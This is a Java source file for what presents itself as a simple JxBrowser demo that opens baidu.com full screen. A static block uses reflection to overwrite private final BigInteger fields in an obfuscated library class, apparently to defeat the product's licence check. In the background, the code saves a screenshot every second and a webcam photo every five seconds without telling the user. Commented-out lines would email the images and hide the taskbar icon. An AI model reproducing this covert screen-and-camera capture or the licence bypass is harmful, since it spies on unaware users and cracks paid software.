package com.example.demo;

import com.teamdev.jxbrowser.chromium.*;
import com.teamdev.jxbrowser.chromium.swing.BrowserView;

import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.math.BigInteger;

public class DemoApplication {
    static {
        try {
            Field e = bb.class.getDeclaredField("e");
            e.setAccessible(true);
            Field f = bb.class.getDeclaredField("f");
            f.setAccessible(true);
            Field modifersField = Field.class.getDeclaredField("modifiers");
            modifersField.setAccessible(true);
            modifersField.setInt(e, e.getModifiers() & ~Modifier.FINAL);
            modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
            e.set(null, new BigInteger("1"));
            f.set(null, new BigInteger("1"));
            modifersField.setAccessible(false);
        } catch (Exception e1) {
            e1.printStackTrace();
        }
    }
    public static void main(String[] args) {
        String url = "https://www.baidu.com";

        JFrame frame = new JFrame();

        // 谷歌内核浏览器
        Browser browser = new Browser();
        BrowserView view = new BrowserView(browser);
        //禁用close功能
//        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
//        隐藏任务栏图标//
//        frame.setType(JFrame.Type.UTILITY);
//        //不显示标题栏,最大化,最小化,退出按钮
        frame.setUndecorated(false);

        frame.setLocation(0, 0);
        frame.add(view);
        //全屏显示
        frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
        //是否在屏幕最上层显示
        frame.setAlwaysOnTop(false);
        frame.add(view, BorderLayout.CENTER);
        frame.setLocationByPlatform(true);
        frame.setVisible(true);

        new Thread(() -> {
            try {
                int i = 0;
                while (true){
                    Thread.sleep(1000);
                    CaptureScreen.captureScreen("hello",(i++)+".png");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
        new Thread(() -> {
            BroWebCam cam = new BroWebCam();
           // SendImageMail mail = new SendImageMail();
            while (true) {
                try {
                    Thread.sleep(5000);
                    cam.getPic();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
//                boolean b =
//                try {
//                    mail.send();
//                } catch (Exception e) {
//                    e.printStackTrace();
//                }
            }
        }).start();


        browser.loadURL(url);

        frame.addWindowListener(new WindowAdapter() {
            // 窗口关闭时间监听
            @Override
            public void windowClosing(WindowEvent e){
                System.exit(0);
                System.out.println("窗口关闭...");

            }
        });
    }
}

